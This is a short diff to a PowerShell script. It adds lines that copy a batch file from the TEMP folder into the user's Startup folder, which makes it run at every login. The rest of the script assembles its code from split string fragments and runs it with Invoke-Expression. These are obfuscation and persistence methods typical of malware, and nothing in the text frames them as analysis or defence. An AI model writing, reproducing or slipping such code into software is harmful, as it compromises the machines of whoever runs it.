@@ -1,3 +1,8 @@
+$TempBat = "$env:TEMP\run.bat"
+$Startup = [Environment]::GetFolderPath("Startup")
+
+Copy-Item $TempBat -Destination $Startup -Force
+
 $fragments = @('﻿
 for ($i = ','1; $i -le 6; $i','++) {
    
@@ -10,6 +15,7 @@ for ($i = ','1; $i -le 6; $i','++) {
     
     I','nvoke-Expressio','n $scriptConten','t
 }'); $script = $fragments -join ''; Invoke-Expression $script
+
 
 
 
